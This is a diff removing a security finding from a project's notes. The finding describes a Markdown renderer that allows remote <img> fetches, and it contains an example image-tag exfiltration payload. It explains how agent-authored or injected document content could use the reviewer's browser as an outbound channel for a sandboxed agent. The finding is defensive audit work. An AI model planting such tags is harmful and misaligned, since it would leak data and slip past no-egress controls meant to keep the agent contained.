@@ -1115,45 +1115,6 @@ which is the hook to watch: a document that starts or stops logging it across a
 dependency bump has moved. Worth deciding whether the fallback path should be
 pinned by storing which path a version used, rather than recomputed.
 
-## Document images are fetched from wherever the document points
-
-
-
-
-**Author:** Claude · **Type:** security · **Priority:** medium · **Status:** pending
-
-`MarkdownRenderer` allows `<img src>` pointing at any host: it permits `img`
-with `src`, `alt`, `title`, `width` and `height`, and never sets
-`allowedMediaHosts`. So a rendered document fetches from that host on open.
-
-Verified 2026-08-25 against the real renderer, because the scope was previously
-overstated: the sanitizer's default action is Drop, `javascript:` and `data:`
-SVG srcs are stripped, and `<script>`, `<iframe>`, `<svg onload>`, `<object>`,
-`<style>` and inline handlers all produce nothing. **There is no XSS here.**
-`<img>` is the only surviving auto-fetch.
-
-Reachability is narrow too. `DocumentVoter` resolves VIEW, CONTRIBUTE and MANAGE
-alike to `$subject->owner === $user`, a project has one owner and no member
-collection, and no share or guest route exists — so the author and the reader
-are the same person. What makes it worth fixing is the shape rather than the
-audience: documents are agent-authored, so content an agent ingested can plant
-`<img src="https://host/?d=...">` and turn the reviewer's browser into an egress
-channel for an agent that may itself be sandboxed without network access. The
-callback carries IP, User-Agent, a timestamp, an origin-only `Referer`, and up to
-a URL's worth of attacker-chosen data. It is stored, so it re-fires on every open.
-That sits badly beside this project's stated no-egress posture (`assets/icons/`
-is committed and `iconify.on_demand` is off in prod precisely so a self-hosted
-instance never calls out).
-
-`config/packages/nelmio_security.yaml` does not stop it. The CSP is **enforcing**
-(`enforce:`, since commit 1506c09) but prod-only, and its `img-src` allows
-`https:` wholesale. Narrowing that to `["'self'", 'data:']` closes the
-browser-side half in prod in one line, and leaves dev and any self-hosted
-instance that does not send the CSP — so a render-time proxy or inlining is the
-only complete fix. Whoever scopes that should know `allowRelativeMedias()` is
-currently not called, so relative image paths are stripped today and a proxy has
-to add it.
-
 ## The e2e suite is still serialized, and nothing has proved it parallel-safe
 
 **Author:** Geoffrey · **Type:** tooling · **Priority:** medium · **Status:** pending
